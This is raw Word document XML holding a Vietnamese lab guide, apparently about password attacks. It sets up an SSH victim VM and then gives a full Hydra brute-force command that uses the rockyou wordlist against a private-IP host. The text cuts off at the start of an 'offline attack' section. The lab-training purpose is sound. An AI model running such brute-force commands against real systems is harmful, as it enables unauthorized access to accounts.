          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Hydra</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2049C6">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="61" w:beforeLines="20" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Chuẩn bị (Máy Nạn Nhân – Ubuntu/Kali Linux VM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FD046E7">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Cài SSH server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> (nếu chưa có):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1124AC6A">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0" w:after="0" w:afterLines="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t>sudo apt update &amp;&amp; sudo apt install openssh-server -y</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D47F25B">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Khởi động SSH service</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C94DAE">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0" w:after="0" w:afterLines="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t xml:space="preserve">sudo systemctl </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t>enable</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t xml:space="preserve"> ssh --now</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E06057">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Kiểm tra port 22 mở</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2928C1FD">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0" w:after="0" w:afterLines="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t>sudo ss -tlnp | grep 22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="239CE431">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>hoặc từ Kali attacker:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="229EB943">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0" w:after="0" w:afterLines="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t>nmap -p 22 192.168.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t>131</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A93E1C">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0" w:after="0" w:afterLines="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>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41174EB">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>🔹 Thực hiện tấn công (Máy Attacker – Kali VM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236A1322">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Chạy Hydra từ máy attacker:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F16820B">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0" w:after="0" w:afterLines="0" w:afterAutospacing="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t>hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="637A8ACE">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>-l kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>: user = kali</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343F23E7">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>-P rockyou.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>: dùng wordlist rockyou</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(có sẵn trong Kali: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>/usr/share/wordlists/rockyou.txt.gz</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>, cần giải nén trước)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27799DF5">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0" w:after="0" w:afterLines="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t>gunzip /usr/share/wordlists/rockyou.txt.gz</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05852286">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ssh://192.168.1.20</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>: địa chỉ IP máy nạn nhân</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5189035A">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Khi Hydra chạy, nó sẽ scan wordlist. Khi đến dòng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>"kali"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> → Hydra sẽ báo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>success</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F274EA9">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5755640" cy="1223645"/>
            <wp:effectExtent l="0" t="0" r="5080" b="1079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5755640" cy="1223645"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C152F2F">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D16C42B">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:shd w:val="clear" w:fill="FFFFFF"/>
        <w:spacing w:before="384" w:beforeAutospacing="0" w:after="192" w:afterAutospacing="0" w:line="360" w:lineRule="atLeast"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">PHẦN </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>OFF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>LINE ATTACK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B4C03A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>sudo nano /var/www/html/config.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACA6BE5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
